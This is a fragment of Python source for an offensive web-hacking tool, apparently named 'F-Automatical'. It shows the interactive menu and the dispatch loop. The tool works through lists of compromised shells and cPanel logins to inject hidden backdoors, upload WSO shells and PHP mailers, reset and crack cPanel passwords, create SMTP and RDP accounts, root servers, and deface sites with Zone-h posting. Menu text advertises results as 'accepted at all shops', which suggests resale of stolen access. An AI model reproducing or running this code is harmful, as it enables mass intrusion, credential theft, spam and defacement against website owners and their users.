        print("   {}[17] Mass Upload/injection backdoor".format(fw))
        print("   [18] {}Mass Chack if Sending mail is Working or not! {}[Results delivery]".format(fw, fr))
        print('   [19] {}Mass Reports replacement {}[Accepted at all Shops]'.format(fw, fg))
        print("   {}[{}20{}] {}From any{} Shell/UPloader, MASS Upload File {}Shell{}/{}Mailer".format(fw, fg, fw, fg, fw, fg, fw, fr))
        print('   [21] {}Reset Passowrd {}cPanel {}+{} Finder/Create SMTP {}[together]'.format(fw, fr, fg, fw, fr))
        print('   [22] {}01 {}+{} 02 {}+{} 04 {}+{} 06 {}+{} 08 {}[All of them together]'.format(fw, fg, fw, fg, fw, fg, fw, fg, fw, fr))
        time.sleep(1)
        print('\n   {}elseif your list is [{}cPanels{}] choose from 23-28:'.format(fc, fr, fc))
        print('   [23] {}Mass Finder SMTP {}+{} Create SMTP'.format(fw, fg, fw))
        print("   [24] {}MASS Upload File [{}Shell{}/{}Mailer{}/{}Other{}]".format(fw, fr, fw, fg, fw, fc, fw))
        print("   {}[25] Mass Upload/injection backdoor".format(fw))
        print('   [26] {}Mass Upload {}Page{}/{}Zip-file {}+{} UNZip'.format(fw, fg, fw, fr, fg, fw))
        print("   [27] {}Mass Chack if Sending mail is Working or not! {}[Results delivery]".format(fw, fr))
        print('   [28] {}Mass Reports replacement {}[Accepted at all Shops]'.format(fw, fg))
        time.sleep(1)
        print('\n   {}elseif your list is [{}Wordpress{}/{}Joomla{}/{}Opencart{}/{}Drupal{}] panels choose 29/30:'.format(fc, fg, fw, fr, fw, fc, fw, fr, fc))
        print("   [29] {}Mass login {}Wordpress{}/{}Joomla{}/{}Opencart{}/{}Drupal{} panel {}+{} UPload Shell".format(fw, fg, fw, fr, fw, fc, fw, fr, fw, fg, fw))
        print('   {}[{}30{}] Mass login {}WordPress{} and UPload Shell by Selenium {}[Chrome Driver] {}[NEW]'.format(fw, flg, fw, fg, fw, fr, flg))
        time.sleep(1)
        print('\n   {}else:'.format(fc))
        print("   {}[{}31{}] About [{}F{}-Automatical].".format(fw, fg, fw, fy, fw))
        print("   {}[{}00{}] {}Exit.".format(fw, fr, fw, fr))
        try:
            w = int(input_Fox('\n --> : '))
        except: w = -1
        while(w == -1 or w > 31):
            print("\n   {}Choose from {}0{} to {}31{}, please.".format(fr, fc, fr, fc, fr))
            try: w = int(input_Fox('\n --> : '))
            except:  w = -1
        print('')
        if (w == 0): print("   {}I LOVE U, See u <3\n".format(fr)); return
        if (w == 31): about(); return
        ps = {1: ['cPanels_Reseted.txt', 'Try_Rest_cPanel_Semi_Automatic.txt', ''],
              2: ['SMTPs.txt', 'SMTPs_Created.txt', ''],
              3: ['info_servers.txt', 'Windows_servers.txt', 'cPanel_servers.txt'],
              4: ['accesshash.txt', 'mycnf.txt', ''], 
              5: ['Configs.txt', '', ''],
              6: ['Configs.txt', 'cPanels_Cracked.txt', 'WHM_Resellers_Cracked.txt'],
              8: ['ROOTs.txt', '', ''],
              9: ['RDPs.txt', '', ''],
              13: ['Leaf_PHP_Mailers.txt', '', ''],
              15: ['indexS.txt', '', ''],
              16: ['Pages.txt', '', ''],
              17: ['Injected_backdoors.txt', 'backdoors/0.0-ALL-backdoors.txt', ''],
              18: ['SendingMail_Work.txt', 'SendingMail_NotWork.txt', ''],
              19: ['Reports_of_Shells.txt', 'Form_reports_of_Shells.txt', ''],
              23: ['SMTPs.txt', 'SMTPs_Created.txt', ''],
              25: ['Injected_backdoors.txt', '', ''],
              26: ['Pages.txt', '', ''],
              27: ['SendingMail_Work.txt', 'SendingMail_NotWork.txt', ''],
              28: ['Reports_of_cPanels.txt', 'Form_reports_of_cPanels.txt', '']}
        newpath = r'Results'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        if (w == 1) :
            print('   {}[{}?{}] {}Choose the procedure that suits you.\n'.format(fw, fr, fw, fc))
            print('   [1] {}Automatic. {}[Default]'.format(fw, fg))
            print('   [2] {}Semi-Automatic.'.format(fw))
            try: tyRest = int(input_Fox('\n --> : '))
            except: tyRest = 1
            print('')
            if (tyRest != 1 and tyRest != 2): tyRest = 1
            elif (tyRest == 2):
                email = str(input_Fox('   Your Email --> : '))
                print('')
        if (w == 19 or w == 28) :
            print('   {}[{}?{}] {}Choose the procedure that suits you.\n'.format(fw, fr, fw, fc))
            print('   [1] {}Automatic. {}[With Proofs]'.format(fw, fg))
            print('   [2] {}Semi-Automatic. {}[Just Check & Form]'.format(fw, fr))
            try: tyReport = int(input_Fox('\n --> : '))
            except: tyReport = 1
            print('')
            getFile('uz.txt', '27889355342417160')
            if (tyReport != 1 and tyReport != 2): tyReport = 1
            elif (tyReport == 2):
                email = str(input_Fox('   Your Email --> : '))
                print('')
            q = str(input_Fox('   {}[{}?{}] {}Do you want Hidden uploader (?Ghost=send) in test.php ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg,fw, fr, fw)))
            print('')
            if (q.lower() == 'y' or q.lower() == 'yes'):
                getFile('t2.txt', '65509287018294347')
                testSend = 't2'
            else :
                getFile('t1.txt', '06396548225704198')
                testSend = 't1'
        if (w == 13) :
            q = str(input_Fox('   {}[{}?{}]{} Do you want the encrypted version? {}[{}Y{}/{}N{}] {}[Default: NO] {}: '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw, fg, fw)))
            if (q.lower() == 'y' or q.lower() == 'yes') : q = 1
            else : q = 0
            if (q == 0) : srcMailer = 'Files/m.txt'; getFile('m.txt', '71461093705682293')
            elif (q == 1): srcMailer = 'Files/m-e.txt'; getFile('m-e.txt', '90983632861720155')
            print('')
        if (w == 15) :
            nameF = str(input_Fox('   Your Index\'s name --> : '))
            while(not os.path.isfile(nameF)):
                print("\n   {}({}) File does not exist, You have to put your index in the same folder.\n".format(fr, nameF))
                nameF = str(input_Fox('   Your Index\'s name --> : '))
            print('\n   {}[{}?{}] {}Choose what you want.\n'.format(fw, fr, fw, fc))
            print('   [1] {}Index with the same name, like => {}http://domain.com/{}'.format(fw, fr, nameF))
            print('   [2] {}Index in the main index, like => {}http://domain.com/'.format(fw, fr))
            try : tyUP = int(input_Fox('\n --> : '))
            except: tyUP = 1
            if (tyUP != 1 and tyUP != 2) : tyUP = 1
            q = str(input_Fox('\n   {}[{}?{}]{} Do you want post in Zone-h ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)))
            if (q.lower() == 'n' or q.lower() == 'no'): q = 0; nameA = ''
            else: q = 1; nameA = str(input_Fox('\n   Attacker name --> : '))
            print('')
        if (w == 16 or w == 26):
            print('   {}[{}!{}] {}You must put your file ({}.zip{}) in the same folder ({}{}{}).\n'.format(fw, fr, fw, fc, fg, fc, fg, tfolder, fc))
            filezip = str(input_Fox('   Your File\'s name (.zip) --> : '))
            while (not os.path.isfile(filezip)):
                print("\n   {}({}) File does not exist, You have to put your file in the same folder.\n".format(fr, filezip))
                filezip = str(input_Fox('   Your File\'s name (.zip) --> : '))
            print('')
        if (w == 17 or w == 25):
            print('\n   {}[{}?{}] {}Choose what you want.\n'.format(fw, fr, fw, fc))
            print('   [1] {}Injection a hidden uploader into one of the main website files.'.format(fw, fr))
            print('   [2] {}Uploading your backdoor on all website folders.'.format(fw, fr))
            try : tyPbk = int(input_Fox('\n --> : '))
            except: tyPbk = 1
            if(tyPbk == 2):
                nameF = str(input_Fox('\n   Your backdoor name (.php) --> : '))
                while (not os.path.isfile(nameF)):
                    print("\n   {}({}) File does not exist, You have to put your backdoor in the same folder.\n".format(fr, nameF))
                    nameF = str(input_Fox('   Your backdoor name (.php) --> : '))
            print('')
        if (w ==18 or w == 27): getFile('t1.txt', '06396548225704198')
        if (w == 7 or w == 14 or w == 20 or w == 24 or w == 29 or w == 30) :
            if(w == 7):
                print('   {}[{}?{}] {}Choose how to hack Panels.\n'.format(fw, fr, fw, fc))
                print('   [1] {}Changing password of old admin user. {}[Default]'.format(fw, fg))
                print('   [2] {}Adding a new admin user.'.format(fw))
                try : MSM = int(input_Fox('\n --> : '))
                except: MSM = 1
                if (MSM != 1 and MSM != 2) : MSM = 1
                if(MSM == 1): typeAc = 'ch'
                else: typeAc = 'ad'
                print('')
            print('   {}[{}?{}] {}Choose what you want to upload it.\n'.format(fw, fr, fw, fc))
            print('   [1] {}F-Filemanager {}(WSO) {}[Accepted at all Shops]'.format(fw, fr, fg))
            print('   [2] {}Leaf PHP Mailer'.format(fw))
            print('   [3] {}Other file'.format(fr))
            try : tyShell = int(input_Fox('\n --> : '))
            except: tyShell = 0
            while (tyShell == 0 or tyShell > 3):
                print("\n   {}Choose from {}1{} to {}3{}, please.".format(fr, fc, fr, fc, fr))
                try: tyShell = int(input_Fox('\n --> : '))
                except: tyShell = 0
            if (tyShell == 2):
                q = str(input_Fox('\n   {}[{}?{}]{} Do you want the encrypted version? {}[{}Y{}/{}N{}] {}[Default: NO] {}: '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw, fg, fw)))
                if (q.lower() == 'y' or q.lower() == 'yes') : q = 1
                else:  q = 0
            if (tyShell == 1) : srcShell = 'Files/fm.txt'; getFile('fm.txt', '12238904536496571')
            elif (tyShell == 2 and q == 0) : srcShell = 'Files/m.txt'; getFile('m.txt', '71461093705682293')
            elif (tyShell == 2 and q == 1): srcShell = 'Files/m-e.txt'; getFile('m-e.txt', '90983632861720155')
            elif (tyShell == 3) :
                print('\n   {}[{}!{}] {}You must put your file in the same folder ({}{}{}).\n'.format(fw, fr, fw, fc, fg, tfolder, fc))
                nameF = str(input_Fox('   Your File\'s name --> : '))
                while(not os.path.isfile(nameF)):
                    print("\n   {}({}) File does not exist, You have to put your file in the same folder.\n".format(fr, nameF))
                    nameF = str(input_Fox('   Your File\'s name --> : '))
                srcShell = nameF
            if (w == 14 or w == 20):
                print('\n   {}[{}?{}] {}Choose where do you want upload it.\n'.format(fw, fr, fw, fc))
                print('   [1] {}In the same path. {}[Default]'.format(fw, fg))
                print('   [2] {}In the main path.'.format(fw))
                try : tyUP = int(input_Fox('\n --> : '))
                except: tyUP = 1
                if (tyUP != 1 and tyUP != 2) : tyUP = 1
            if (w == 14 or w == 20 or w == 24):
                if(tyShell == 3):
                    q = str(input_Fox('\n   {}[{}?{}] {}Do you want upload your file with {}Random{} name ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fr, fc, fw, fg, fw, fr, fw)))
                    if (q.lower() == 'n' or q.lower() == 'no') : q = 0
                    else:  q = 1
                else: q = 1
            if (w == 7 or w == 29 or w == 30): q = str(input_Fox('\n   {}[{}?{}] {}Do you want to get (cPanel/SMTP) ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)))
            print('')
        if(w == 20): Option20(yList, tyUP, srcShell, tyShell, q); return
        if (w == 23 or w == 24 or w == 25 or w == 26 or w == 27 or w == 28):
            for site in yList:
                try:
                    datacPanel = site.strip()
                    if (w == 28):
                        cp = cPanel(datacPanel)
                        if (cp is False): print(''); continue
                        else:
                            cpL = datacPanel.split('|')
                            if (tyReport == 1): solving_cP_Reports_A(cpL[0], cpL[1], cpL[2], cp[1], cp[0], cp[2], cp[3], testSend)
                            elif (tyReport == 2): solving_cP_Reports_S(cpL[0], cpL[1], cpL[2], cp[1], cp[0], cp[2], cp[3], email, testSend)
                    else:
                        cp = cPanel(datacPanel, up=1)
                        if (cp is False): print(''); continue
                        else:
                            newBackdoor = check(cp)
                            open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(newBackdoor, backdoor2))
                            if (w == 23): SMTPs(newBackdoor)
                            elif (w == 24): file_UPloader(newBackdoor, srcShell, tyShell, q)
                            elif (w == 25 and tyPbk == 1): backdoor_Injection(newBackdoor)
                            elif (w == 25 and tyPbk == 2): MASS_Backdoor(newBackdoor, nameF)
                            elif (w == 26): UNZIP(newBackdoor, filezip)
                            elif (w == 27): sending_Checker(newBackdoor, datacPanel)
                    print('')
                except:
                    print('   {}[-] Failed.\n'.format(fr))
            if (w != 24): sevedin(ps[w][0], ps[w][1], ps[w][2])
            return
        if(w == 29): Option29(yList, srcShell, tyShell, q); return
        if(w == 30): Option30(yList, srcShell, tyShell, q); return
        for site in yList:
            try:
                url = shell_Form(site).strip()
                print('   --| {}{}'.format(fc, url))
                shell_path = file_UPloader_ALL(url)
                if (shell_path is False):
                    print('   {}[-] Shell not Working OR Upload failed.\n'.format(fr))
                    open('Results/Failed.txt', 'a').write('{}\n'.format(url))
                    continue
                shell_path = check(shell_path)
                if (shell_path is False):
                    print('   {}[-] Shell not Working OR Upload failed.\n'.format(fr))
                    open('Results/Failed.txt', 'a').write('{}\n'.format(url))
                    continue
                print('   {}[+] Shell is Working.'.format(fg))
                open('Results/F-backdoors.txt', 'a').write('{}?action={}\n'.format(shell_path, backdoor2))
                if (w == 1):
                    if (tyRest == 1): resetPwdA_Fox(shell_path, url)
                    elif (tyRest == 2): resetPwdS_Fox(shell_path, url, email)
                elif (w == 2): SMTPs(shell_path)
                elif (w == 3): info(shell_path, url)
                elif (w == 4): accesshash_mycnf(shell_path, url)
                elif (w == 5): configs(shell_path, url)
                elif (w == 6):
                    config = configs(shell_path, url)
                    if (config is False): print(''); continue
                    else:
                        cPanels_Cracker(shell_path)
                        whmcs_ex(shell_path, url)
                elif (w == 7):
                    config = configs(shell_path, url)
                    if (config is False): print(''); continue
                    else:
                        logins = panels(shell_path, config[0], config[1], typeAc)
                        if (logins is False): print(''); continue
                        else:
                            shells = UPer_SH_by_Panels(logins[0], logins[1], logins[2], logins[3], 0, srcShell, tyShell)
                            if (q.lower() == 'y' or q.lower() == 'yes'):
                                if (shells is False): print(''); continue
                                else:
                                    for shell in shells:
                                        try:
                                            print('   --| {}{}'.format(fc, URL_FOX(shell)))
                                            newShell = check(shell)
                                            resetPwdA_Fox(newShell,'{}?action={}\n'.format(newShell, backdoor2))
                                            SMTPs(newShell)
                                        except:
                                            print('   {}[-] Failed.'.format(fr))
                                        print('')
                            else: return
                elif (w == 8): rooter(shell_path, url)
                elif (w == 9): RDP_creator(shell_path, url)
                elif (w == 10): domains(shell_path)
                elif (w == 11): mail_single(shell_path)
                elif (w == 12):
                    config = configs(shell_path, url)
                    if (config is False): print(''); continue
                    else: mail_mass(shell_path, config[0])
                elif (w == 13): mailer_UPloader(shell_path, srcMailer)
                elif (w == 14):
                    if (tyUP == 1): file_UPloader(shell_path, srcShell, tyShell + 3, q)
                    elif (tyUP == 2): file_Main_UPloader(shell_path, srcShell, tyShell + 3, q)
                elif (w == 15):
                    if (tyUP == 1): index_UPloader_1(shell_path, nameF, q, nameA)
                    elif (tyUP == 2): index_UPloader_2(shell_path, nameF, q, nameA)
                elif (w == 16): UNZIP(shell_path, filezip)
                elif (w == 17):
                    if (tyPbk == 1): backdoor_Injection(shell_path)
                    elif (tyPbk == 2): MASS_Backdoor(shell_path, nameF)
                elif (w == 18): sending_Checker(shell_path, url)
                elif (w == 19):
                    if (tyReport == 1): solving_SH_Reports_A(shell_path, url, testSend)
                    elif (tyReport == 2): solving_SH_Reports_S(shell_path, url, email, testSend)
                elif (w == 21):
                    resetPwdA_Fox(shell_path, url)
                    SMTPs(shell_path)
                elif (w == 22):
                    resetPwdA_Fox(shell_path, url)
                    SMTPs(shell_path)
                    accesshash_mycnf(shell_path, url)
                    rooter(shell_path, url)
                    config = configs(shell_path, url)
                    if (config is False): print(''); continue
                    else:
                        cPanels_Cracker(shell_path)
                        whmcs_ex(shell_path, url)
                print('')
            except :
                print('   {}[-] Shell not Working OR Upload failed.\n'.format(fr))
                open('Results/Failed.txt', 'a').write('{}\n'.format(url.strip()))
        sevedin(ps[w][0], ps[w][1], ps[w][2])
    except :
        pass

def main():
    try:
        F()
        input_Fox('   {}[{}!{}] {}Press Enter to exit '.format(fw, fr, fw, fc))
    except:
        pass
main()